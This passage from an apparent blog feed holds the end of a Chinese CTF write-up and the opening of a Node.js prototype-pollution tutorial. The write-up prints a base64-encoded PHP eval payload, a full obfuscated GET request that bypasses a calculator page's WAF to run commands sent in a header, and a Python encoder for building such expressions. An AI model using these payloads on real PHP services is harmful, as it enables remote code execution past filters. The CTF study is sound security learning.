class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure><p>最终的payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /calc.php?<span class="built_in">num</span>=(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">9</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((-<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B0</span>%7D)))(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))))((((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">8</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">2</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))()))%3B HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.156</span><span class="number">.140</span><span class="number">.90</span>:<span class="number">8081</span></span><br><span class="line">z: php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure><p>后面又看到了<a href="https://www.mrkaixin.top/posts/fbd7e4e1/#1-0-bypass-waf" target="_blank" rel="noopener">开心师傅的脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" Python</span></span><br><span class="line"><span class="string">Author: Mrkaixin</span></span><br><span class="line"><span class="string">Date: 2020-05-30 21:32</span></span><br><span class="line"><span class="string">FileName: exp.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">word_dict = &#123;</span><br><span class="line">    <span class="string">"0"</span>: <span class="string">"((0).(0))"</span>,</span><br><span class="line">    <span class="string">"1"</span>: <span class="string">"((1).(0))"</span>,</span><br><span class="line">    <span class="string">"2"</span>: <span class="string">"((2).(0))"</span>,</span><br><span class="line">    <span class="string">"3"</span>: <span class="string">"((3).(0))"</span>,</span><br><span class="line">    <span class="string">"4"</span>: <span class="string">"((4).(0))"</span>,</span><br><span class="line">    <span class="string">"5"</span>: <span class="string">"((5).(0))"</span>,</span><br><span class="line">    <span class="string">"6"</span>: <span class="string">"((6).(0))"</span>,</span><br><span class="line">    <span class="string">"7"</span>: <span class="string">"((7).(0))"</span>,</span><br><span class="line">    <span class="string">"8"</span>: <span class="string">"((8).(0))"</span>,</span><br><span class="line">    <span class="string">"9"</span>: <span class="string">"((9).(0))"</span>,</span><br><span class="line">    <span class="string">"="</span>: <span class="string">"(((1).(0)))|(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"+"</span>: <span class="string">"((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"."</span>: <span class="string">"((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"&lt;"</span>: <span class="string">"(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"$"</span>: <span class="string">"(((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"@"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"~"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">"&#123;"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"&#125;"</span>: <span class="string">"(((0).(0)))|((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">","</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"("</span>: <span class="string">"(((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">")"</span>: <span class="string">"(((9).(0)))%26((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"d"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"e"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"h"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"i"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"j"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"l"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"n"</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"o"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((0).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((1).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"r"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"s"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((3).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((4).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"u"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((5).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"v"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((6).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"w"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((7).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"x"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"y"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((9).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"z"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"E"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"G"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">    <span class="string">"K"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"O"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"B"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"C"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"A"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"I"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"H"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"L"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"D"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"N"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"J"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%34).(1))"</span>,</span><br><span class="line">    <span class="string">"F"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">got = [i <span class="keyword">for</span> i <span class="keyword">in</span> word_dict.keys()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里写上想要的，配合高师傅的脚本一起用最好</span></span><br><span class="line">iwant = string.ascii_letters + <span class="string">"_"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Or</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) | ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)|<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">And</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) &amp; ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)%26<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># exp</span></span><br><span class="line">    exp = <span class="string">""</span></span><br><span class="line">    <span class="comment"># exp = "var"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i]&#125;</span>)."</span>)</span><br><span class="line">        <span class="keyword">elif</span> i.upper() <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i.upper()]&#125;</span>)."</span>)</span><br><span class="line">            <span class="comment"># print(i.upper() + word_dict[i.upper()])</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i + <span class="string">"lost"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    And()</span><br><span class="line">    <span class="comment"># Or()</span></span><br><span class="line">    <span class="comment"># product()</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="tag1" scheme="https://0xcreed.jxustctf.top/tags/tag1/"/>
    
      <category term="tag2" scheme="https://0xcreed.jxustctf.top/tags/tag2/"/>
    
      <category term="tag3" scheme="https://0xcreed.jxustctf.top/tags/tag3/"/>
    
  </entry>
  
  <entry>
    <title>nodejs学习</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-02T15:23:43.000Z</published>
    <updated>2020-06-06T15:57:10.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-原型链污染"><a href="#1-原型链污染" class="headerlink" title="1.原型链污染"></a>1.原型链污染</h2><ul><li><code>prototype</code> 和 <code>__proto__</code></li></ul><p>每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener"><strong>原型链</strong></a>中的最后一个环节。</p><a id="more"></a><p><img src="/2020/06/nodejs学习/image-20200605161200256.png" alt="image-20200605161200256"></p><p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> 